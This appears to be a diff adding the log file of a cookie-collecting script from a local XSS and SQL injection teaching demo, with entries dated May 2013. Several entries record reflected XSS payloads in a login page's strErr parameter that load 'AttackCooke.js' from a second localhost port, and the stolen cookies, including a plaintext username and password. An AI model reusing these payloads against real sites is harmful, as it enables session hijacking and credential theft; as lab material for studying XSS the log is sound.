@@ -1,0 +1,89 @@
+﻿You got cookie!
+From: http://localhost:1272/XSS%20Demo/LoginPage.aspx?strErr=%3Cscript%20src=%22http://localhost:1436/AttackCooke.js%22%3E%20%3C/script%3E
+Sunday, May 19, 2013 12:59:37 AM
+Cookies of the day:
+Cookie #1 : age=22
+Cookie #2 :  username=hoahue
+Cookie #3 :  password=123456&
+Cookie #4 :  email=
+ ------------------------------------- 
+
+You got cookie!
+From: http://localhost:1272/XSS%20Demo/LoginPage.aspx?strErr=%3Cscript%20src=%22http://localhost:1436/AttackCooke.js%22%3E%20%3C/script%3E
+Sunday, May 19, 2013 1:01:05 AM
+Cookies of the day:
+Cookie #1 : age=22
+Cookie #2 :  username=hoahue
+Cookie #3 :  password=123456&
+Cookie #4 :  email=
+ ------------------------------------- 
+
+You got cookie!
+From: http://localhost:1272/XSS%20Demo/LoginPage.aspx?strErr=%3Cscript%20src=%22http://localhost:1436/AttackCooke.js%22%3E%20%3C/script%3E
+Sunday, May 19, 2013 1:01:13 AM
+Cookies of the day:
+Cookie #1 : age=22
+Cookie #2 :  username=hoahue
+Cookie #3 :  password=123456&
+Cookie #4 :  email=
+ ------------------------------------- 
+
+You got cookie!
+From: http://localhost:1272/XSS%20Demo/LoginPage.aspx?strErr=%22%3E%20%3Cscript%20src=%22http://localhost:1436/AttackCooke.js%22%3E%3C/script%3E
+Sunday, May 19, 2013 1:05:00 AM
+Cookies of the day:
+Cookie #1 : age=22
+Cookie #2 :  username=hoahue
+Cookie #3 :  password=123456&
+Cookie #4 :  email=
+ ------------------------------------- 
+
+You got cookie!
+From: http://localhost:1272/XSS%20Demo/Categories.aspx
+Sunday, May 19, 2013 8:18:06 AM
+Cookies of the day:
+Cookie #1 : age=22
+Cookie #2 :  username=hoahue
+Cookie #3 :  password=123456&
+Cookie #4 :  email=
+ ------------------------------------- 
+
+You got cookie!
+From: http://localhost:1272/SQL%20Injection%20Demo/Categories.aspx
+Sunday, May 19, 2013 8:31:32 AM
+Cookies of the day:
+Cookie #1 : age=22
+Cookie #2 :  username=hoahue
+Cookie #3 :  password=123456&
+ ------------------------------------- 
+
+You got cookie!
+From: http://localhost:1272/XSS%20Demo/Categories.aspx
+Sunday, May 19, 2013 8:31:53 AM
+Cookies of the day:
+Cookie #1 : age=22
+Cookie #2 :  username=hoahue
+Cookie #3 :  password=123456&
+ ------------------------------------- 
+
+You got cookie!
+From: http://localhost:3880/XSS%20Demo/LoginPage.aspx?strErr=%3E%20%3Cscript%20src=%22http://localhost:1436/maliciousscript.js%22%3E%3C/script%3E%20Thuc%20hien%20chen%20lenh:%20LoginPage.aspx?strErr=%22%3E%20%3Cscript%20src=%22http://localhost:1436/AttackCooke.js%22%3E%3C/script%3E
+Tuesday, May 21, 2013 8:25:12 AM
+Cookies of the day:
+Cookie #1 : email=
+ ------------------------------------- 
+
+You got cookie!
+From: http://localhost:3880/XSS%20Demo/Categories.aspx
+Tuesday, May 21, 2013 8:28:34 AM
+Cookies of the day:
+Cookie #1 : email=
+ ------------------------------------- 
+
+You got cookie!
+From: http://localhost:3880/XSS%20Demo/LoginPage.aspx?strErr=%3E%20%3Cscript%20src=%22http://localhost:1436/maliciousscript.js%22%3E%3C/script%3E%20Thuc%20hien%20chen%20lenh:%20LoginPage.aspx?strErr=%22%3E%20%3Cscript%20src=%22http://localhost:1436/AttackCooke.js%22%3E%3C/script%3E
+Tuesday, May 21, 2013 8:32:07 AM
+Cookies of the day:
+Cookie #1 : email=
+ ------------------------------------- 
+
